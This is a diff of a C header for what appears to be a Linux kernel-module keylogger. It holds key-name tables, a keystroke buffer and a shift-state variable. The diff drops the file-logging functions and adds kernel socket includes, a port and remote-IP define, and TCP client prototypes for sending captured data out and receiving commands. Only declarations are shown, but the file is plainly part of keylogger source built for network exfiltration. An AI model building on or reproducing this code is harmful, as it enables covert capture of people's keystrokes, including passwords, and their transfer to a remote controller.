@@ -8,10 +8,28 @@
 #include <asm/uaccess.h> 
 #include <linux/fs.h>
 
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/init.h>
+
+#include <linux/net.h>
+#include <linux/inet.h>
+#include <net/sock.h>
+#include <linux/tcp.h>
+#include <linux/in.h>
+#include <linux/socket.h>
+#include <linux/slab.h>
+
 #define UK "UNKNOWN_KEY"
+#define PORT 1337
+#define REMOTE_IP "127.0.0.1"
 
 extern uint8_t shift_pressed;
 extern loff_t pos;
+extern struct socket *conn_socket;
+extern char server_buffer[10];
+extern char key_buffer[1024];
+extern int buffer_index;
 
 static char *key_names[] = {
    UK, "<ESC>",
@@ -69,10 +87,17 @@ static char *shift_key_names[] = {
    "<PageDown>", "<Insert>", "<Delete>"
 };
 
+
+
+
+
 bool isShift(uint16_t code);
 char *getKeyText(uint16_t code);
 
-void write_to_file(struct file* file, char* buffer, int size);
-void read_from_file(struct file* file, char* buffer, int size);
-struct file* open_file(char* file_name);
-void close_file(struct file* file);
+int tcp_client_send(struct socket *sock, const char *buf, const size_t length, unsigned long flags);
+int tcp_client_receive(struct socket *sock, char *str, unsigned long flags);
+int tcp_client_connect(void);
+int send_data(const char* buffer, const size_t length);
+void close_client(void);
+int receive_cmd(char* buffer);
+
